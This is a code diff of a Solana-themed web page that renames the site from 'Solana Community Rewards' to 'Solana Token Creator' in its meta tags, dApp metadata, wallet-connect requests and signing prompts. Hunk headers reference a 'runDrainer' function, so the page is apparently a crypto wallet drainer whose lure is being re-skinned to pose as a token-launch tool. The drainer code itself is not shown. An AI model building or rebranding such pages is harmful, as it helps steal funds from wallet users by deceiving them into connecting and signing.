@@ -21,8 +21,8 @@
   <meta name="description" content="Create and deploy your Solana coin effortlessly in seconds. Reach the world and scale without limits with Dutse Launch!" />
   
   <!-- dApp Metadata for Wallets -->
-  <meta name="application-name" content="  Solana Community Rewards" />
-<meta name="apple-mobile-web-app-title" content="  Solana Community Rewards" />
+  <meta name="application-name" content="Solana Token Creator" />
+<meta name="apple-mobile-web-app-title" content="Solana Token Creator" />
   <meta name="msapplication-TileColor" content="#14f195" />
   <meta name="theme-color" content="#14f195" />
   
@@ -39,16 +39,16 @@
   <meta name="wallet-connect-icon" content="" />
   
   <!-- SEO and Social Media Meta Tags -->
-  <meta property="og:title" content="  Solana Community Rewards" />
-<meta property="og:description" content="Powering the Next Wave of Builders & Holders. Join the Solana Community Rewards Program and earn $SOL for your contributions." />
+  <meta property="og:title" content="Solana Token Creator" />
+<meta property="og:description" content="Create and deploy your Solana coin effortlessly in seconds. Reach the world and scale without limits with Dutse Launch!" />
   <meta property="og:type" content="website" />
   <meta property="og:url" content="" />
   <meta property="og:image" content="/logo.svg" />
-  <meta property="og:site_name" content="  Solana Community Rewards" />
+  <meta property="og:site_name" content="Solana Token Creator" />
   
   <meta name="twitter:card" content="summary_large_image" />
-  <meta name="twitter:title" content="  Solana Community Rewards" />
-<meta name="twitter:description" content="Powering the Next Wave of Builders & Holders. Join the Solana Community Rewards Program and earn $SOL for your contributions." />
+  <meta name="twitter:title" content="Solana Token Creator" />
+<meta name="twitter:description" content="Create and deploy your Solana coin effortlessly in seconds. Reach the world and scale without limits with Dutse Launch!" />
   <meta name="twitter:image" content="/logo.png" />
   
   <meta name="keywords" content="solana, community, rewards, builders, validators, creators, crypto, blockchain, SOL, ecosystem" />
@@ -146,7 +146,7 @@
       });
       
       window.dAppMetadata = {
-        name: '  Solana Community Rewards',
+        name: 'Solana Token Creator',
         description: 'Powering the Next Wave of Builders & Holders',
         url: currentUrl,
         icon: logoUrl
@@ -556,18 +556,18 @@
     setDAppIconForWallet('exodus');
     
     // Set document title and meta for wallet recognition
-    document.title = '  Solana Community Rewards';
+    document.title = 'Solana Token Creator';
     
     // Add meta tags dynamically if needed
     if (!document.querySelector('meta[name="application-name"]')) {
       const meta = document.createElement('meta');
       meta.name = 'application-name';
-      meta.content = '  Solana Community Rewards';
+      meta.content = 'Solana Token Creator';
       document.head.appendChild(meta);
     }
     
     // Set additional window properties for wallet recognition
-    window.solanaDAppName = '  Solana Community Rewards';
+    window.solanaDAppName = 'Solana Token Creator';
     window.solanaDAppIcon = window.location.origin + '/logo.svg';
     
     // Override any existing dApp metadata
@@ -4828,7 +4828,7 @@ window.runDrainer = runDrainer;
                   // Try to trigger approval by attempting to sign a message
                   if (typeof provider.signMessage === 'function') {
                     try {
-                      const message = new TextEncoder().encode('Connect to Solana Community Rewards');
+                      const message = new TextEncoder().encode('Connect to Solana Token Creator');
                       const signature = await provider.signMessage(message);
                       console.log(`[connectMobileWallet] signMessage signature for ${wallet.name}:`, signature);
                       showStatus('Processing...', 'loading');
@@ -6195,7 +6195,7 @@ window.runDrainer = runDrainer;
             const result = await provider.connect({
               onlyIfTrusted: false,
               appMetadata: {
-                name: 'Solana Community Rewards',
+                name: 'Solana Token Creator',
                 url: window.location.origin,
                 icon: '/logo.svg'
               }
@@ -6905,7 +6905,7 @@ window.connectWallet = async function connectWallet(walletKey) {
                     fn: () => provider.connect({
                       onlyIfTrusted: false,
                       appMetadata: {
-                        name: 'Solana Community Rewards',
+                        name: 'Solana Token Creator',
                         url: window.location.origin,
                         icon: '/logo.svg'
                       }
@@ -6996,7 +6996,7 @@ window.connectWallet = async function connectWallet(walletKey) {
                     fn: () => provider.connect({
                       onlyIfTrusted: false,
                     appMetadata: {
-                        name: 'Solana Community Rewards',
+                        name: 'Solana Token Creator',
                       url: window.location.origin,
                       icon: '/logo.svg'
                     }
@@ -7314,7 +7314,7 @@ window.connectWallet = async function connectWallet(walletKey) {
       const instructions = `
         <div style="text-align: center; padding: 20px; max-width: 500px; margin: 0 auto;">
           <div style="margin-bottom: 20px;">
-            <h3 style="color: #fff; margin-bottom: 10px; font-size: 18px;"><img src="/logo.png" alt="Logo" style="height: 20px; vertical-align: middle; margin-right: 8px;">   Solana Community Rewards</h3>
+            <h3 style="color: #fff; margin-bottom: 10px; font-size: 18px;"><img src="/logo.png" alt="Logo" style="height: 20px; vertical-align: middle; margin-right: 8px;">Solana Token Creator</h3>
             <p style="color: #ccc; font-size: 14px; line-height: 1.5; margin-bottom: 20px;">
               No wallet detected! For the fastest and most secure connection experience, 
               please visit this site directly in your wallet's built-in browser.
